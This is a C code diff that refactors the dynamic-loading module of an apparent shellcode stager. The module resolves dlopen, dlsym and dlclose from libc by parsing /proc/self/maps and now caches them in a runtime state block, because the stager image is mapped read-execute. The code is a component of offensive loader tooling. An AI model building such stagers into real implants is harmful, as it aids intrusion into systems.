@@ -1,4 +1,5 @@
 #include "dynload.h"
+#include "state.h"
 #include "syscalls.h"
 #include "utils.h"
 
@@ -24,18 +25,8 @@ typedef struct {
 #define DT_STRTAB 5
 #define DT_SYMTAB 6
 
-typedef void *(*dlopen_fn)(const char *, int);
-typedef void *(*dlsym_fn)(void *, const char *);
-typedef int (*dlclose_fn)(void *);
-
-/* Cached dl* entry points. The non-zero `ready` field forces this into .data
- * (raw shellcode extraction drops .bss), mirroring _cached_syscall_gadget. */
-static struct {
-  long ready;
-  dlopen_fn dlopen_;
-  dlsym_fn dlsym_;
-  dlclose_fn dlclose_;
-} g_dl = {1, 0, 0, 0};
+/* Cached dl* entry points live in the writable runtime state block (see
+ * state.h), not in .data, because the stager image is mapped RX. */
 
 /* Parse a leading hex number (start address of a /proc/self/maps line). */
 static unsigned long parse_hex(const char *s) {
@@ -138,35 +129,36 @@ static void *resolve_sym(void *base, const char *name) {
 
 /* Resolve dlopen/dlsym/dlclose from libc once. Returns 0 on success. */
 static int resolve_dl(void) {
-  if (g_dl.ready == 0)
-    return (g_dl.dlopen_ && g_dl.dlsym_ && g_dl.dlclose_) ? 0 : -1;
+  struct stager_state *st = get_stager_state();
+  if (st->dl_ready == 0)
+    return (st->dlopen_ && st->dlsym_ && st->dlclose_) ? 0 : -1;
 
   unsigned long libc = find_libc_base();
   if (libc) {
-    g_dl.dlopen_ = (dlopen_fn)resolve_sym((void *)libc, "dlopen");
-    g_dl.dlsym_ = (dlsym_fn)resolve_sym((void *)libc, "dlsym");
-    g_dl.dlclose_ = (dlclose_fn)resolve_sym((void *)libc, "dlclose");
+    st->dlopen_ = (dlopen_fn)resolve_sym((void *)libc, "dlopen");
+    st->dlsym_ = (dlsym_fn)resolve_sym((void *)libc, "dlsym");
+    st->dlclose_ = (dlclose_fn)resolve_sym((void *)libc, "dlclose");
   }
-  g_dl.ready = 0;
-  return (g_dl.dlopen_ && g_dl.dlsym_ && g_dl.dlclose_) ? 0 : -1;
+  st->dl_ready = 0;
+  return (st->dlopen_ && st->dlsym_ && st->dlclose_) ? 0 : -1;
 }
 
 void *dynload_open(const char *soname, int flags) {
   if (resolve_dl() != 0)
     return NULL;
-  return g_dl.dlopen_(soname, flags);
+  return get_stager_state()->dlopen_(soname, flags);
 }
 
 void *dynload_sym(void *handle, const char *name) {
   if (resolve_dl() != 0)
     return NULL;
-  return g_dl.dlsym_(handle, name);
+  return get_stager_state()->dlsym_(handle, name);
 }
 
 int dynload_close(void *handle) {
   if (resolve_dl() != 0)
     return -1;
-  return g_dl.dlclose_(handle);
+  return get_stager_state()->dlclose_(handle);
 }
 
 unsigned long dynload_find_libc(void) { return find_libc_base(); }
